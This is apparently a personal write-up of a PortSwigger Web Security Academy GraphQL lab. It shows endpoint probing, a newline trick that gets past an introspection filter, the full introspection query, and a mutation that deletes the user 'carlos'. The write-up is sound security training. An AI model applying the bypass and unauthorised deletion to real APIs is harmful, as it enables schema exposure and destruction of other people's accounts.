# Lab 3: Finding a Hidden GraphQL Endpoint

**Platform:** PortSwigger Web Security Academy

**Category:** GraphQL API Vulnerabilities (PRACTITIONER)

<img width="822" height="175" alt="image" src="https://github.com/user-attachments/assets/a77f5d01-448e-4dca-a146-fb67a36a8a69" />

## Lab Description

The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete carlos. 

## Steps

### 1. Discovering the Hidden GraphQL Endpoint

First, I inspected the application's requests using Burp Suite → Proxy → HTTP history.

However, I couldn't find any GraphQL requests because the application did not expose the endpoint through its normal functionality.

I decided to discover the endpoint manually by testing some common GraphQL related paths using POST requests.

The paths I tested were:

```text
/graphql
/graphiql
/graphql.php
/graphql/console
/api
/api/graphql
/graphql/api
/graphql/graphql
```

After testing these endpoints, I discovered that `/api` was responding differently.

The server returned a `Method Not Allowed` response when I sent a POST request.

I decided to change the request method to GET, keep the `Content-Type: application/json` header, and send an empty JSON body:

```json
{}
```

This time, the server returned an error indicating that the GraphQL query was missing.

This confirmed that I had found the hidden GraphQL endpoint.

<img width="1106" height="552" alt="image" src="https://github.com/user-attachments/assets/e166150a-4b97-48b0-b08f-12aa5600fd1a" />

### 2. Testing GraphQL Endpoint Functionality

Before attempting introspection, I wanted to verify that the endpoint was actually processing GraphQL queries.

I sent a simple query:

```graphql
query {
    __typename
}
```

The server successfully processed the query and returned the root query type.

This confirmed that the endpoint was functional.

### 3. Bypassing Introspection Restrictions

Next, I attempted to retrieve the GraphQL schema using introspection.

However, the server returned the following error:

```text
GraphQL introspection is not allowed, but the query contained __schema or __type
```
<img width="1182" height="420" alt="image" src="https://github.com/user-attachments/assets/d3e30178-bdcb-47d1-ae90-7b646b8de6d8" />


This indicated that the application had implemented a restriction against introspection queries.

I decided to investigate whether the restriction could be bypassed by changing the formatting of the introspection query.

I added a newline between `__schema` and its opening brace:

```graphql
query IntrospectionQuery {
    __schema
    {
        queryType {
            name
        }
    }
}
```

The modified query successfully bypassed the introspection restriction.

I then used the same formatting in the full introspection query to retrieve the complete schema.

### 4. Retrieving the GraphQL Schema

The full introspection query was:

```graphql
query IntrospectionQuery {
    __schema
    {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

The server returned the GraphQL schema successfully.

### 5. Analyzing the Schema Using InQL

To make the returned schema easier to analyze, I used the **InQL Burp Suite extension**.

My steps were:

1. Saved the introspection response as a JSON file.
2. Opened the InQL extension in Burp Suite.
3. Selected the saved JSON file.
4. Clicked **Analyze** to parse and visualize the available GraphQL operations.

After analyzing the schema, I discovered the following interesting operations:

```graphql
type DeleteOrganizationUserResponse {
    user: User!
}

type User {
    id: Int!
    username: String!
}

type mutation {
    deleteOrganizationUser(
        input: DeleteOrganizationUserInput
    ): DeleteOrganizationUserResponse
}

type query {
    getUser(id: Int!): User
}

input DeleteOrganizationUserInput {
    id: Int!
}
```

- `getUser(id: Int!)`: Retrieves a user by their ID.
- `deleteOrganizationUser(input: DeleteOrganizationUserInput)`: Deletes an organization user using their ID.

<img width="1406" height="928" alt="image" src="https://github.com/user-attachments/assets/8b6dad99-3592-476b-ba90-c74523525018" />


The `User` object also exposed the `id` and `username` fields, which would help me identify the target account.

### 6. Identifying Carlos's User ID

Before deleting the account, I needed to identify Carlos's user ID.

I used the `getUser` query discovered during schema analysis.

By testing user IDs, I identified that Carlos had the ID `3`.

### 7. Crafting the Deletion Mutation

After identifying Carlos's ID, I constructed a GraphQL mutation using the `deleteOrganizationUser` operation.

The final request was:

```graphql
mutation deleteOrganizationUser {
    deleteOrganizationUser(input: {id: 3}) {
        user {
            id
            username
        }
    }
}
```

The mutation takes the user ID as input and requests the deleted user's ID and username in the response.

After sending the request, the server successfully processed the deletion.

<img width="1135" height="497" alt="image" src="https://github.com/user-attachments/assets/d45b2420-9e56-4433-8579-b536a0e9aab8" />

I confirmed that Carlos's account had been deleted.

Alhamdulillah, the lab was solved.

<img width="1747" height="447" alt="image" src="https://github.com/user-attachments/assets/7279fbee-bd3d-4613-aa0c-cb34b9c1633e" />

---

**Lab Link:** [Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

See you in the next lab solution, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
